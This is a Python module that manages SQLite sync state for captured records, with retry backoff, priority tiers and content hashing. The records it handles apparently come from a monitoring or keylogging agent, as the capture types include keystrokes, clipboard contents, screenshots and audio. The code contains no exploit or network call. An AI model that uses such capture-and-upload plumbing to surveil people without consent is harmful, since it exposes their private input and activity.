"""
Sync Ledger — extended per-record sync state tracking.

The existing ``captures`` table uses a binary ``sent`` flag (0/1).
The ledger adds rich sync metadata in a **separate** ``sync_ledger`` table
so the original schema is untouched and the upgrade is non-breaking.

State machine per record::

    PENDING → QUEUED → IN_FLIGHT → SYNCED
                  ↓          ↓
               FAILED ←────┘
                  ↓
             (retry → QUEUED  or  DEAD after max_attempts)

Each record also tracks:
  * ``content_hash`` — SHA-256 of the serialised data for dedup / delta skip
  * ``batch_id`` — which send-batch it belongs to
  * ``attempt_count`` / ``next_retry_at`` — exponential backoff state
  * ``last_error`` — diagnostic message from the most recent failure
  * ``sync_seq`` — monotonic sequence number for ordering guarantees
  * ``priority`` — CRITICAL / NORMAL / LOW for priority-based sync
"""

from __future__ import annotations

import hashlib
import itertools
import logging
import sqlite3
import threading
import time
from enum import Enum
from typing import Any

logger = logging.getLogger(__name__)


class SyncState(str, Enum):
    """Lifecycle state of a record in the sync ledger."""

    PENDING = "PENDING"
    QUEUED = "QUEUED"
    IN_FLIGHT = "IN_FLIGHT"
    SYNCED = "SYNCED"
    FAILED = "FAILED"
    DEAD = "DEAD"  # exceeded max_attempts — will not be retried


class SyncPriority(str, Enum):
    """Sync priority tiers — CRITICAL syncs first."""

    CRITICAL = "CRITICAL"
    NORMAL = "NORMAL"
    LOW = "LOW"


# Map capture types to default priority
_DEFAULT_PRIORITY: dict[str, SyncPriority] = {
    "command": SyncPriority.CRITICAL,
    "config": SyncPriority.CRITICAL,
    "keystroke": SyncPriority.NORMAL,
    "clipboard": SyncPriority.NORMAL,
    "window": SyncPriority.NORMAL,
    "mouse": SyncPriority.LOW,
    "screenshot": SyncPriority.LOW,
    "audio": SyncPriority.LOW,
}

_PRIORITY_ORDER = {SyncPriority.CRITICAL: 0, SyncPriority.NORMAL: 1, SyncPriority.LOW: 2}

# Monotonic counter for sync_seq (process-local, reset on restart is fine
# because sync_seq is only used for ordering within a session).
_seq_counter = itertools.count(1)


class SyncLedger:
    """Extended sync-state tracking backed by SQLite.

    Uses the **same database file** as :class:`~storage.sqlite_storage.SQLiteStorage`
    but creates its own tables.  The constructor accepts the raw
    ``sqlite3.Connection`` (or a path to open one).
    """

    def __init__(
        self,
        conn: sqlite3.Connection | str,
        config: dict[str, Any] | None = None,
    ) -> None:
        cfg = (config or {}).get("sync", {})
        self._max_attempts = int(cfg.get("max_retry_attempts", 5))
        self._backoff_base = float(cfg.get("retry_backoff_base", 2.0))
        self._backoff_max = float(cfg.get("retry_backoff_max", 300))

        if isinstance(conn, str):
            self._conn = sqlite3.connect(conn, check_same_thread=False)
            self._conn.execute("PRAGMA journal_mode=WAL")
            self._owns_conn = True
        else:
            self._conn = conn
            self._owns_conn = False

        self._conn.row_factory = sqlite3.Row
        self._lock = threading.Lock()
        self._create_tables()

    # ------------------------------------------------------------------
    # Schema
    # ------------------------------------------------------------------

    def _create_tables(self) -> None:
        self._conn.executescript("""
            CREATE TABLE IF NOT EXISTS sync_ledger (
                id              INTEGER PRIMARY KEY AUTOINCREMENT,
                capture_id      INTEGER NOT NULL UNIQUE,
                sync_state      TEXT    NOT NULL DEFAULT 'PENDING',
                priority        TEXT    NOT NULL DEFAULT 'NORMAL',
                content_hash    TEXT    NOT NULL,
                batch_id        TEXT,
                attempt_count   INTEGER DEFAULT 0,
                max_attempts    INTEGER DEFAULT 5,
                last_attempt_at REAL,
                next_retry_at   REAL,
                last_error      TEXT,
                sync_seq        INTEGER,
                created_at      REAL    NOT NULL,
                synced_at       REAL
            );

            CREATE INDEX IF NOT EXISTS idx_sl_state
                ON sync_ledger(sync_state);
            CREATE INDEX IF NOT EXISTS idx_sl_priority
                ON sync_ledger(priority);
            CREATE INDEX IF NOT EXISTS idx_sl_next_retry
                ON sync_ledger(next_retry_at);
            CREATE INDEX IF NOT EXISTS idx_sl_capture_id
                ON sync_ledger(capture_id);
            CREATE INDEX IF NOT EXISTS idx_sl_batch_id
                ON sync_ledger(batch_id);
            CREATE INDEX IF NOT EXISTS idx_sl_content_hash
                ON sync_ledger(content_hash);
        """)
        self._conn.commit()

    # ------------------------------------------------------------------
    # Registration
    # ------------------------------------------------------------------

    def register(self, capture_id: int, data: str, capture_type: str = "") -> int:
        """Register a new capture in the ledger.

        Returns the ledger row ID.  If the capture_id already exists
        (idempotent re-insert), returns the existing row ID.
        """
        content_hash = hashlib.sha256(data.encode("utf-8", errors="replace")).hexdigest()
        priority = _DEFAULT_PRIORITY.get(capture_type, SyncPriority.NORMAL).value
        now = time.time()
        seq = next(_seq_counter)

        with self._lock:
            # Idempotent: skip if already tracked
            row = self._conn.execute(
                "SELECT id FROM sync_ledger WHERE capture_id = ?", (capture_id,)
            ).fetchone()
            if row:
                return row["id"]

            cursor = self._conn.execute(
                """INSERT INTO sync_ledger
                   (capture_id, sync_state, priority, content_hash,
                    max_attempts, sync_seq, created_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (capture_id, SyncState.PENDING.value, priority,
                 content_hash, self._max_attempts, seq, now),
            )
            self._conn.commit()
            return cursor.lastrowid  # type: ignore[return-value]

    def register_batch(self, items: list[dict[str, Any]]) -> int:
        """Register multiple captures at once.  Returns count registered."""
        now = time.time()
        count = 0
        with self._lock:
            try:
                self._conn.execute("BEGIN")
                for item in items:
                    capture_id = item["id"]
                    data = str(item.get("data", ""))
                    capture_type = item.get("type", "")
                    content_hash = hashlib.sha256(
                        data.encode("utf-8", errors="replace")
                    ).hexdigest()
                    priority = _DEFAULT_PRIORITY.get(capture_type, SyncPriority.NORMAL).value
                    seq = next(_seq_counter)

                    existing = self._conn.execute(
                        "SELECT id FROM sync_ledger WHERE capture_id = ?", (capture_id,)
                    ).fetchone()
                    if existing:
                        continue

                    self._conn.execute(
                        """INSERT INTO sync_ledger
                           (capture_id, sync_state, priority, content_hash,
                            max_attempts, sync_seq, created_at)
                           VALUES (?, ?, ?, ?, ?, ?, ?)""",
                        (capture_id, SyncState.PENDING.value, priority,
                         content_hash, self._max_attempts, seq, now),
                    )
                    count += 1
                self._conn.commit()
            except Exception:
                self._conn.rollback()
                raise
        return count

    # ------------------------------------------------------------------
    # Querying
    # ------------------------------------------------------------------

    def get_pending(
        self,
        limit: int = 50,
        priority: SyncPriority | None = None,
    ) -> list[dict[str, Any]]:
        """Return records ready to sync, ordered by priority then sequence.

        Includes records in PENDING state and FAILED records whose
        ``next_retry_at`` has passed.
        """
        now = time.time()
        params: list[Any] = [SyncState.PENDING.value, SyncState.FAILED.value, now]
        prio_clause = ""
        if priority:
            prio_clause = "AND sl.priority = ?"
            params.append(priority.value)
        params.append(limit)

        # Order: priority tier ASC (CRITICAL=0 first), then sync_seq ASC
        sql = f"""
            SELECT sl.*, c.type, c.data, c.file_path, c.file_size, c.timestamp AS capture_ts
            FROM sync_ledger sl
            JOIN captures c ON c.id = sl.capture_id
            WHERE (sl.sync_state = ? OR (sl.sync_state = ? AND sl.next_retry_at <= ?))
            {prio_clause}
            ORDER BY
                CASE sl.priority
                    WHEN 'CRITICAL' THEN 0
                    WHEN 'NORMAL'   THEN 1
                    WHEN 'LOW'      THEN 2
                    ELSE 3
                END ASC,
                sl.sync_seq ASC
            LIMIT ?
        """
        with self._lock:
            rows = self._conn.execute(sql, params).fetchall()
        return [dict(r) for r in rows]

    def is_duplicate(self, content_hash: str) -> bool:
        """Check if a content hash already exists in SYNCED state."""
        with self._lock:
            row = self._conn.execute(
                "SELECT 1 FROM sync_ledger WHERE content_hash = ? AND sync_state = ? LIMIT 1",
                (content_hash, SyncState.SYNCED.value),
            ).fetchone()
        return row is not None

    # ------------------------------------------------------------------
    # State transitions
    # ------------------------------------------------------------------

    def mark_queued(self, ledger_ids: list[int], batch_id: str) -> None:
        """Transition records from PENDING/FAILED to QUEUED with a batch_id."""
        if not ledger_ids:
            return
        placeholders = ",".join("?" * len(ledger_ids))
        with self._lock:
            self._conn.execute(
                f"UPDATE sync_ledger SET sync_state = ?, batch_id = ? "
                f"WHERE id IN ({placeholders})",
                [SyncState.QUEUED.value, batch_id] + ledger_ids,
            )
            self._conn.commit()

    def mark_in_flight(self, batch_id: str) -> None:
        """Transition a batch from QUEUED to IN_FLIGHT."""
        now = time.time()
        with self._lock:
            self._conn.execute(
                "UPDATE sync_ledger SET sync_state = ?, last_attempt_at = ?, "
                "attempt_count = attempt_count + 1 "
                "WHERE batch_id = ? AND sync_state = ?",
                (SyncState.IN_FLIGHT.value, now, batch_id, SyncState.QUEUED.value),
            )
            self._conn.commit()

    def mark_synced(self, batch_id: str) -> int:
        """Mark all IN_FLIGHT records in a batch as SYNCED.

        Also marks the corresponding ``captures`` rows as ``sent = 1``.
        Returns the number of records updated.
        """
        now = time.time()
        with self._lock:
            try:
                self._conn.execute("BEGIN")

                # Get capture_ids before updating
                rows = self._conn.execute(
                    "SELECT capture_id FROM sync_ledger "
                    "WHERE batch_id = ? AND sync_state = ?",
                    (batch_id, SyncState.IN_FLIGHT.value),
                ).fetchall()
                capture_ids = [r["capture_id"] for r in rows]

                cursor = self._conn.execute(
                    "UPDATE sync_ledger SET sync_state = ?, synced_at = ? "
                    "WHERE batch_id = ? AND sync_state = ?",
                    (SyncState.SYNCED.value, now, batch_id, SyncState.IN_FLIGHT.value),
                )
                updated = cursor.rowcount

                # Also mark captures.sent = 1 for backward compatibility
                if capture_ids:
                    ph = ",".join("?" * len(capture_ids))
                    self._conn.execute(
                        f"UPDATE captures SET sent = 1 WHERE id IN ({ph})",
                        capture_ids,
                    )

                self._conn.commit()
                return updated
            except Exception:
                self._conn.rollback()
                raise

    def mark_failed(self, batch_id: str, error: str) -> None:
        """Mark IN_FLIGHT records as FAILED and schedule retry."""
        now = time.time()
        with self._lock:
            try:
                self._conn.execute("BEGIN")

                rows = self._conn.execute(
                    "SELECT id, attempt_count, max_attempts FROM sync_ledger "
                    "WHERE batch_id = ? AND sync_state = ?",
                    (batch_id, SyncState.IN_FLIGHT.value),
                ).fetchall()

                for row in rows:
                    if row["attempt_count"] >= row["max_attempts"]:
                        # Exceeded max retries — mark as DEAD
                        self._conn.execute(
                            "UPDATE sync_ledger SET sync_state = ?, last_error = ? "
                            "WHERE id = ?",
                            (SyncState.DEAD.value, error, row["id"]),
                        )
                    else:
                        # Schedule retry with exponential backoff
                        delay = min(
                            self._backoff_base ** row["attempt_count"],
                            self._backoff_max,
                        )
                        self._conn.execute(
                            "UPDATE sync_ledger SET sync_state = ?, last_error = ?, "
                            "next_retry_at = ? WHERE id = ?",
                            (SyncState.FAILED.value, error, now + delay, row["id"]),
                        )

                self._conn.commit()
            except Exception:
                self._conn.rollback()
                raise

    def mark_partial(self, batch_id: str, synced_ids: list[int], error: str) -> None:
        """Handle partial success — some records synced, others failed."""
        if synced_ids:
            ph = ",".join("?" * len(synced_ids))
            now = time.time()
            with self._lock:
                try:
                    self._conn.execute("BEGIN")
                    # Synced subset
                    self._conn.execute(
                        f"UPDATE sync_ledger SET sync_state = ?, synced_at = ? "
                        f"WHERE batch_id = ? AND id IN ({ph})",
                        [SyncState.SYNCED.value, now, batch_id] + synced_ids,
                    )
                    # Capture rows
                    cap_rows = self._conn.execute(
                        f"SELECT capture_id FROM sync_ledger WHERE id IN ({ph})",
                        synced_ids,
                    ).fetchall()
                    cap_ids = [r["capture_id"] for r in cap_rows]
                    if cap_ids:
                        cph = ",".join("?" * len(cap_ids))
                        self._conn.execute(
                            f"UPDATE captures SET sent = 1 WHERE id IN ({cph})", cap_ids
                        )
                    self._conn.commit()
                except Exception:
                    self._conn.rollback()
                    raise

        # Mark the rest as failed
        self.mark_failed(batch_id, error)

    # ------------------------------------------------------------------
    # Metrics
    # ------------------------------------------------------------------

    def get_stats(self) -> dict[str, Any]:
        """Return counts per state for dashboard / health reporting."""
        with self._lock:
            rows = self._conn.execute(
                "SELECT sync_state, COUNT(*) as cnt FROM sync_ledger GROUP BY sync_state"
            ).fetchall()
            oldest = self._conn.execute(
                "SELECT MIN(created_at) FROM sync_ledger WHERE sync_state != ?",
                (SyncState.SYNCED.value,),
            ).fetchone()

        stats: dict[str, int] = {s.value: 0 for s in SyncState}
        for r in rows:
            stats[r["sync_state"]] = r["cnt"]
        stats["oldest_unsynced_age"] = (
            time.time() - oldest[0] if oldest and oldest[0] else 0.0
        )
        return stats

    # ------------------------------------------------------------------
    # Cleanup
    # ------------------------------------------------------------------

    def purge_synced(self, older_than_seconds: int = 86400) -> int:
        """Delete SYNCED ledger entries older than the given age."""
        cutoff = time.time() - older_than_seconds
        with self._lock:
            cursor = self._conn.execute(
                "DELETE FROM sync_ledger WHERE sync_state = ? AND synced_at < ?",
                (SyncState.SYNCED.value, cutoff),
            )
            self._conn.commit()
            return cursor.rowcount

    def close(self) -> None:
        if self._owns_conn:
            self._conn.close()
